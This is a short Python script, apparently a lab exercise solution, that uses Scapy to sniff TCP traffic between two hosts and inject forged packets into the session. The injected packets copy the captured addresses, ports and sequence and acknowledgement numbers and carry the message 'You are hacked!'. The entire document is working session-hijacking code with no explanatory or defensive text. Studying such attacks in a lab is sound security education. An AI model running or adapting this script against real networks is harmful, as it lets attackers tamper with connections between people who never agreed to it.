from scapy.all import *

def spoof_packet(pkt:Packet) -> None:
    # The two lines below are for Task 3.2
    # print("The ACK: %i" % pkt[TCP].ack)
    # print("The SEQ: %i" % pkt[TCP].seq)

    ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags="PA")
    forge_message = "You are hacked!"
    spoofed_pkt = ip / tcp / forge_message
    send(spoofed_pkt, verbose=0)

while True:
    sniff(filter="host 10.0.0.1 and host 10.0.0.2 and tcp", prn=spoof_packet)